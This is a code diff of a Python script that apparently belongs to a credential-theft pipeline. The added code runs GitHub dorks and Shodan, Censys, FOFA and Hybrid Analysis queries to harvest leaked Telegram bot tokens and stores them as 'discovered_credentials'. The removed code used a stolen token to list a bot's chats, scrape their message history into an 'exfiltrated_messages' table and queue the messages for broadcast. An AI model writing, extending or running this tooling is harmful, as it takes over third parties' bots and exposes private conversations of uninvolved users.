@@ -1,110 +1,135 @@
 import asyncio
 import sys
 import os
+import hashlib
+import time
 
 # Add project root to sys.path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-from app.services.scraper_srv import scraper_service
 from app.core.database import db
 from app.core.security import security
-from app.core.config import settings
-import hashlib
+from app.services.scanners import ShodanService, FofaService, GithubService, CensysService, HybridAnalysisService
+
+# Initialize Services
+shodan = ShodanService()
+fofa = FofaService()
+github = GithubService()
+censys = CensysService()
+hybrid = HybridAnalysisService()
 
 def _calculate_hash(token: str) -> str:
     return hashlib.sha256(token.encode()).hexdigest()
 
-async def run_manual_scan():
-    print("🚀 Starting Standalone Manual Scraper (No Redis)...")
-    
-    # 1. INPUT: Ask for Token
-    # Hardcode here or ask user input
-    bot_token = input("Enter Bot Token to Scan: ").strip()
-    if not bot_token:
-        print("❌ valid token required.")
-        return
-
-    # 2. SAVE/CHECK CREDENTIAL
-    print(f"\n💾 Saving/Checking credential in DB...")
-    token_hash = _calculate_hash(bot_token)
-    encrypted_token = security.encrypt(bot_token)
-    
-    data = {
-        "bot_token": encrypted_token,
-        "token_hash": token_hash,
-        "source": "manual_script",
-        "status": "pending",
-        "meta": {"manual": True}
-    }
-    
-    # Upsert
-    res = db.table("discovered_credentials").upsert(data, on_conflict="token_hash", ignore_duplicates=True).select("id").execute()
-    
-    if res.data:
-        cred_id = res.data[0]['id']
-        print(f"✅ Credential Saved/Found. ID: {cred_id}")
-    else:
-        # If ignore_duplicates=True and row exists, it might not return data depending on Supabase version
-        # Let's fetch it manually to be sure
-        res = db.table("discovered_credentials").select("id").eq("token_hash", token_hash).execute()
-        if res.data:
-            cred_id = res.data[0]['id']
-            print(f"✅ Credential Exists. ID: {cred_id}")
-        else:
-            print("❌ Failed to retrieve Credential ID.")
-            return
-
-    # 3. DISCOVER CHATS
-    print(f"\n🔎 Discovering Chats (Direct Telethon Call)...")
-    try:
-        chats = await scraper_service.discover_chats(bot_token)
-        print(f"✅ Found {len(chats)} chats.")
-    except Exception as e:
-        print(f"❌ Discovery Failed: {e}")
-        return
-
-    if not chats:
-        print("⚠️ No chats found. Exiting.")
-        return
-
-    # 4. UPDATE DB & SCRAPE EACH CHAT
-    for chat in chats:
-        print(f"\n----------------------------------------")
-        print(f"Processing Chat: {chat['name']} (ID: {chat['id']})")
-        
-        # Update Meta (Just for the first one primarily, or log all)
-        db.table("discovered_credentials").update({
-            "chat_id": chat["id"],
-            "meta": {"chat_name": chat["name"], "type": chat["type"], "enriched": True}
-        }).eq("id", cred_id).execute()
-
-        # Scrape History
-        print(f"⏳ Scraping History...")
-        try:
-            messages = await scraper_service.scrape_history(bot_token, chat["id"])
-            print(f"✅ Retrieved {len(messages)} messages.")
-        except Exception as e:
-            print(f"❌ Scraping Failed: {e}")
+def save_manifest(results, source_name: str, verbose=True):
+    saved_count = 0
+    for item in results:
+        token = item.get("token")
+        if not token or token == "MANUAL_REVIEW_REQUIRED":
             continue
+        
+        token_hash = _calculate_hash(token)
+        try:
+            encrypted_token = security.encrypt(token)
+            data = {
+                "bot_token": encrypted_token,
+                "token_hash": token_hash,
+                "source": source_name,
+                "status": "pending",
+                "meta": item.get("meta", {})
+            }
             
-        # Save Messages
-        print(f"💾 Saving to Exfiltrated Messages...")
-        new_count = 0
-        for msg in messages:
-            msg["credential_id"] = cred_id
-            try:
-                db.table("exfiltrated_messages").insert(msg).execute()
-                new_count += 1
-            except Exception:
-                pass # Skip dups
-        
-        print(f"✨ Saved {new_count} NEW messages to DB.")
-        
-        if new_count > 0:
-            print(f"⚠️ Note: These messages are set 'is_broadcasted=False'.\n   Your running Railway Worker should pick them up automatically for broadcasting soon.")
+            # Upsert
+            res = db.table("discovered_credentials").upsert(data, on_conflict="token_hash", ignore_duplicates=True).select("id").execute()
+            
+            if res.data:
+                print(f"  🎯 [NEW] Saved Credential ID: {res.data[0]['id']}")
+                saved_count += 1
+        except Exception as e:
+            if verbose: print(f"  ❌ Save Error: {e}")
+            pass
+    return saved_count
 
-    print("\n✅ Manual Scan Complete.")
+async def run_scanners():
+    print("🚀 Starting LOCAL OSINT Scan (All Sources)...")
+    print("-------------------------------------------------")
+
+    # 1. GitHub
+    print("\n🐱 [GitHub] Starting Scan...")
+    dorks = [
+        "filename:.env api.telegram.org",
+        "path:config api.telegram.org",
+        "\"TELEGRAM_BOT_TOKEN\"",
+        "language:python \"ApplicationBuilder\" \"token\"",
+        "language:python \"Telethon\" \"api_id\"",
+        "filename:config.json \"bot_token\"",
+        "filename:settings.py \"TELEGRAM_TOKEN\"",
+         "\"api.telegram.org\""
+    ]
+    
+    total_gh = 0
+    for i, dork in enumerate(dorks):
+        print(f"  > Dorking: {dork}")
+        try:
+            results = github.search(dork)
+            count = save_manifest(results, "github")
+            total_gh += count
+            print(f"    Found {len(results)} matches, {count} new.")
+        except Exception as e:
+            print(f"    ❌ Error: {e}")
+        
+        if i < len(dorks) - 1:
+            time.sleep(2) # Respect rate limits slightly
+
+    # 2. Shodan
+    print("\n🌎 [Shodan] Starting Scan...")
+    try:
+        query = "product:Telegram"
+        print(f"  > Query: {query}")
+        results = shodan.search(query)
+        count = save_manifest(results, "shodan")
+        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
+    except Exception as e:
+        print(f"  ❌ Shodan Error: {e}")
+
+    # 3. Censys
+    print("\n🔍 [Censys] Starting Scan...")
+    try:
+        query = "services.port: 443 and services.http.response.body: \"api.telegram.org\""
+        print(f"  > Query: {query}")
+        results = censys.search(query)
+        count = save_manifest(results, "censys")
+        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
+    except Exception as e:
+        print(f"  ❌ Censys Error: {e}")
+
+    # 4. FOFA
+    print("\n🦈 [FOFA] Starting Scan...")
+    try:
+        query = 'body="api.telegram.org"'
+        print(f"  > Query: {query}")
+        results = fofa.search(query)
+        count = save_manifest(results, "fofa")
+        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
+    except Exception as e:
+        print(f"  ❌ FOFA Error: {e}")
+
+    # 5. Hybrid Analysis
+    print("\n🦠 [HybridAnalysis] Starting Scan...")
+    try:
+        query = "api.telegram.org"
+        print(f"  > Query: {query}")
+        results = hybrid.search(query)
+        # HA often returns manual review needed, but let's try
+        count = save_manifest(results, "hybrid_analysis")
+        print(f"  ✅ Processed {len(results)} reports ({count} tokens saved).")
+    except Exception as e:
+        print(f"  ❌ HybridAnalysis Error: {e}")
+
+    print("\n-------------------------------------------------")
+    print("🏁 Full Scan Complete.")
+    print("   Check your Railway Worker logs (General Topic) for Enrichment alerts!")
+    print("   (The worker will see the new 'pending' rows and enrich them automatically)")
 
 if __name__ == "__main__":
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(run_manual_scan())
+    asyncio.run(run_scanners())
